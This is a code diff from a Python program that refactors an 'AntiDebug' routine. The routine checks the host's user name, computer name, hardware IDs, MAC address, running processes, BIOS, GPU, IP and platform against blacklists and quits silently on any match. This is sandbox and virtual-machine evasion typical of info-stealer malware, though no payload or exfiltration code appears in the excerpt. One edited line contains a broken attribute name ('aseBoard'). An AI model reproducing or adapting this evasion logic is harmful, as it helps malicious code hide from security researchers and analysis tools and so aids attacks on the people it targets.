@@ -19,7 +19,7 @@ import subprocess
 import requests
 import platform
 import json
-import data
+from data import BlackList
 
 
 
@@ -163,63 +163,63 @@ def AntiDebug(oneStart):
 
     processlist = psutil.process_iter(['name'])
 
-    if os.getenv("USERPROFILE") in data.blacklisted_Users:
+    if os.getenv("USERPROFILE") in BlackList.Users:
         os._exit(0)
 
 
-    if os.getenv('COMPUTERNAME') in data.blacklisted_PC_Name:
+    if os.getenv('COMPUTERNAME') in BlackList.PC_Name:
         os._exit(0)
 
 
-    if checkHWID() in data.blacklisted_HWID:
+    if checkHWID() in BlackList.HWID:
         os._exit(0)
 
 
-    if checkMAC() in data.blacklisted_Mac_Address:
+    if checkMAC() in BlackList.Mac_Address:
         os._exit(0)
 
 
     for exe in processlist:
-        if exe.info.get('name') in data.blacklisted_Processes:
+        if exe.info.get('name') in BlackList.Processes:
             os._exit(0)
 
-    if checkBIOS() in data.blacklisted_Bios:
+    if checkBIOS() in BlackList.Bios:
         os._exit(0)
 
     
-    if checkManufacture() in data.blacklisted_Manufacture:
+    if checkManufacture() in BlackList.Manufacture:
         os._exit(0)
 
 
-    if checkBASE() in data.blacklisted_BaseBoard:
+    if checkBASE() in BlackList.aseBoard:
         os._exit(0)
 
 
-    if checkCPU() in data.blacklisted_CPU:
+    if checkCPU() in BlackList.CPU:
         os._exit(0)
 
 
-    if checkDrive() in data.blacklisted_Drive:
+    if checkDrive() in BlackList.Drive:
         os._exit(0)
 
 
-    if checkHW_profile() in data.blacklisted_HW_Profile_GUID:
+    if checkHW_profile() in BlackList.HW_Profile_GUID:
         os._exit(0)
  
 
 
-    if checkGUID() in data.blacklisted_Machine_GUID:
+    if checkGUID() in BlackList.Machine_GUID:
         os._exit(0)
 
     gpus = checkGPU()
     for gpu in gpus:
-        if gpu in data.blacklisted_GPU:
+        if gpu in BlackList.GPU:
             os._exit(0)
 
-    if checkIP() in data.blacklisted_ip:
+    if checkIP() in BlackList.ip:
         os._exit(0)
 
-    if checkPlatform() in data.blacklisted_Platform:
+    if checkPlatform() in BlackList.Platform:
         os._exit(0)
     
     for proc in processlist:
